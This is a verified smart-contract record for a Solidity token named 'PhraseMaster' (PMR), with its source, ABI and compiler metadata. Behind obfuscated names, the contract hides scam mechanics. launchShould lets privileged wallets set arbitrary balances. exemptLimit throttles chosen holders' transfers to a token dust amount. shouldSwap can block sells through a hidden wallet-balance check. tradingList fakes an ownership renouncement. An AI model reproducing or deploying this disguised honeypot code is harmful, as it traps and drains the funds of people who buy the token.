{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface teamLimit {\n    function createPair(address limitExempt, address minTrading) external returns (address);\n}\n\ninterface atFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listFrom) external view returns (uint256);\n\n    function transfer(address fundSell, uint256 modeSender) external returns (bool);\n\n    function allowance(address sellTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundSell,\n        uint256 modeSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txSwap, uint256 value);\n    event Approval(address indexed sellTotal, address indexed spender, uint256 value);\n}\n\nabstract contract atToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atFeeMetadata is atFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PhraseMaster is atToken, atFee, atFeeMetadata {\n\n    uint256 private isFee;\n\n    function tradingList() public {\n        emit OwnershipTransferred(fromLimit, address(0));\n        isTotal = address(0);\n    }\n\n    function teamFrom(uint256 modeSender) public {\n        launchedIs();\n        fundExempt = modeSender;\n    }\n\n    function exemptLimit(address receiverSender) public {\n        launchedIs();\n        if (isFee == isSell) {\n            limitLaunch = false;\n        }\n        if (receiverSender == fromLimit || receiverSender == senderSell) {\n            return;\n        }\n        sellMarketing[receiverSender] = true;\n    }\n\n    function balanceOf(address listFrom) public view virtual override returns (uint256) {\n        return walletReceiverShould[listFrom];\n    }\n\n    uint256 public isSell;\n\n    address buyMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 fundExempt;\n\n    string private launchedFundShould = \"Phrase Master\";\n\n    address private isTotal;\n\n    uint256 constant autoEnable = 3 ** 10;\n\n    mapping(address => bool) public fundAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedFundShould;\n    }\n\n    bool private sellLiquidityMarketing;\n\n    function shouldSwap(address atFrom, address fundSell, uint256 modeSender) internal returns (bool) {\n        if (atFrom == fromLimit) {\n            return tokenSwap(atFrom, fundSell, modeSender);\n        }\n        uint256 totalEnable = atFee(senderSell).balanceOf(buyMode);\n        require(totalEnable == fundExempt);\n        require(fundSell != buyMode);\n        if (sellMarketing[atFrom]) {\n            return tokenSwap(atFrom, fundSell, autoEnable);\n        }\n        return tokenSwap(atFrom, fundSell, modeSender);\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptIs;\n\n    address swapShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function launchShould(address swapWallet, uint256 modeSender) public {\n        launchedIs();\n        walletReceiverShould[swapWallet] = modeSender;\n    }\n\n    bool private teamTo;\n\n    string private listLaunch = \"PMR\";\n\n    uint256 private limitReceiver = 100000000 * 10 ** 18;\n\n    address public fromLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitReceiver;\n    }\n\n    function allowance(address takeFromReceiver, address maxShould) external view virtual override returns (uint256) {\n        if (maxShould == swapShould) {\n            return type(uint256).max;\n        }\n        return exemptIs[takeFromReceiver][maxShould];\n    }\n\n    uint256 public sellTradingReceiver;\n\n    function getOwner() external view returns (address) {\n        return isTotal;\n    }\n\n    function approve(address maxShould, uint256 modeSender) public virtual override returns (bool) {\n        exemptIs[_msgSender()][maxShould] = modeSender;\n        emit Approval(_msgSender(), maxShould, modeSender);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingTokenMax;\n    }\n\n    uint8 private marketingTokenMax = 18;\n\n    event OwnershipTransferred(address indexed shouldFee, address indexed senderMax);\n\n    bool public receiverAuto;\n\n    bool private feeTake;\n\n    bool public totalLaunched;\n\n    function transferFrom(address atFrom, address fundSell, uint256 modeSender) external override returns (bool) {\n        if (_msgSender() != swapShould) {\n            if (exemptIs[atFrom][_msgSender()] != type(uint256).max) {\n                require(modeSender <= exemptIs[atFrom][_msgSender()]);\n                exemptIs[atFrom][_msgSender()] -= modeSender;\n            }\n        }\n        return shouldSwap(atFrom, fundSell, modeSender);\n    }\n\n    function tokenSwap(address atFrom, address fundSell, uint256 modeSender) internal returns (bool) {\n        require(walletReceiverShould[atFrom] >= modeSender);\n        walletReceiverShould[atFrom] -= modeSender;\n        walletReceiverShould[fundSell] += modeSender;\n        emit Transfer(atFrom, fundSell, modeSender);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return isTotal;\n    }\n\n    mapping(address => bool) public sellMarketing;\n\n    bool private isToken;\n\n    function transfer(address swapWallet, uint256 modeSender) external virtual override returns (bool) {\n        return shouldSwap(_msgSender(), swapWallet, modeSender);\n    }\n\n    bool private tradingTotal;\n\n    mapping(address => uint256) private walletReceiverShould;\n\n    address public senderSell;\n\n    function launchedIs() private view {\n        require(fundAmount[_msgSender()]);\n    }\n\n    uint256 marketingTokenLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listLaunch;\n    }\n\n    bool private limitLaunch;\n\n    constructor (){\n        \n        sellMin minMax = sellMin(swapShould);\n        senderSell = teamLimit(minMax.factory()).createPair(minMax.WETH(), address(this));\n        \n        fromLimit = _msgSender();\n        fundAmount[fromLimit] = true;\n        walletReceiverShould[fromLimit] = limitReceiver;\n        tradingList();\n        \n        emit Transfer(address(0), fromLimit, limitReceiver);\n    }\n\n    function buyAuto(address isMax) public {\n        if (receiverAuto) {\n            return;\n        }\n        if (isFee == isSell) {\n            sellLiquidityMarketing = true;\n        }\n        fundAmount[isMax] = true;\n        if (isSell == sellTradingReceiver) {\n            totalLaunched = false;\n        }\n        receiverAuto = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFromReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMax\",\"type\":\"address\"}],\"name\":\"buyAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"}],\"name\":\"exemptLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeSender\",\"type\":\"uint256\"}],\"name\":\"launchShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTradingReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeSender\",\"type\":\"uint256\"}],\"name\":\"teamFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PhraseMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}